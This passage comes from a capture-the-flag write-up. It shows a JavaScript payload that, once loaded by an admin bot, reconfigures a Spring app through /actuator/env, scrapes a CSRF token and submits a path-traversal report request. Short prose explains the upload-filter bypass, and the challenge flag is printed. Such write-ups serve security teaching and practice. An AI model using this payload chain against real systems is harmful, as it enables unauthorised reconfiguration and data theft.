class="language-javascript">      <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// STAGE 1: If visited by editorial bot, reconfigure the app and trigger report</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/env&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;app.enforce-production&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;false&quot;</span> &#125;),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/env&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">headers</span>: &#123; <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span> &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;app.active-config&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;dev&quot;</span> &#125;),</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/actuator/refresh&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">2000</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> adminPage = <span class="title function_">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/admin&quot;</span>)).<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> csrfToken = adminPage.<span class="title function_">match</span>(<span class="regexp">/name=&quot;_csrf&quot; value=&quot;([^&quot;]+)&quot;/</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>();</span></span><br><span class="line"><span class="language-javascript">      params.<span class="title function_">append</span>(<span class="string">&quot;_csrf&quot;</span>, csrfToken);</span></span><br><span class="line"><span class="language-javascript">      params.<span class="title function_">append</span>(<span class="string">&quot;endpoint&quot;</span>, <span class="string">&quot;/api/../files/&quot;</span> + filename);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&quot;/admin/report&quot;</span>, &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>, <span class="attr">body</span>: params &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>After uploading the exploit (bypassing the extension check by
-modifying the filename to <code>.html</code> in the multipart request),
-the <code>editorial</code> bot triggers the reconfiguration and the
-<code>report-runner</code>. The flag is then leaked to the tags of
-Article 1.</p>
-<h3 id="flag">Flag</h3>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}</span></span>
 
       
     </div>
